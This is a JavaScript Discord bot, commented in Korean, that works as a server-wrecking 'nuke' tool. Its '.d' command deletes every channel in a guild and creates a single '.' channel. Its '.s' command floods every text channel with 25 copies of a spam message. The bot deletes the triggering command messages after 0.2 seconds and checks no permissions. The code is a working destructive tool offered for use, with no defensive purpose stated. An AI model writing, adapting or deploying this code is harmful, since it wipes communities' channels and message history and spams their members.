const fs = require('fs');
const { Client, GatewayIntentBits, ActivityType } = require('discord.js');

// `token.txt` 파일에서 토큰 읽기
const token = fs.readFileSync('token.txt', 'utf8').trim();
const config = JSON.parse(fs.readFileSync('config.json', 'utf8'));

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

client.once('ready', () => {
    console.log('Bot is online!');
    client.user.setActivity(config.botStatus, { type: ActivityType.Playing });
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    // .으로 시작하는 메시지는 0.2초 후에 삭제
    if (message.content.startsWith('.')) {
        setTimeout(() => message.delete(), 200);
    }

    // .d 명령어: 모든 채널 삭제 후 "." 채널 생성
    if (message.content === '.d') {
        const channels = await message.guild.channels.fetch();
        for (const [id, channel] of channels) {
            await channel.delete();
        }
        setTimeout(async () => {
            await message.guild.channels.create({ name: '.' });
        }, 5000);
    }

    // .s 명령어: 모든 채널에 25번 메시지 전송
    if (message.content === '.s') {
        const channels = await message.guild.channels.fetch();
        for (const [id, channel] of channels) {
            if (channel.isTextBased()) {
                for (let i = 0; i < 25; i++) {
                    await channel.send(config.spamMessage);
                }
            }
        }
    }

    // .help 명령어: 현재 명령어 목록을 개인 메시지로 전송
    if (message.content === '.help') {
        const helpMessage = `
        Available commands:
        1. .d - Delete all channels and create "." channel
        2. .s - Send 25 messages to all channels
        3. .help - Send this help message
        `;
        await message.author.send(helpMessage);
    }
});

// 봇 로그인
client.login(token);
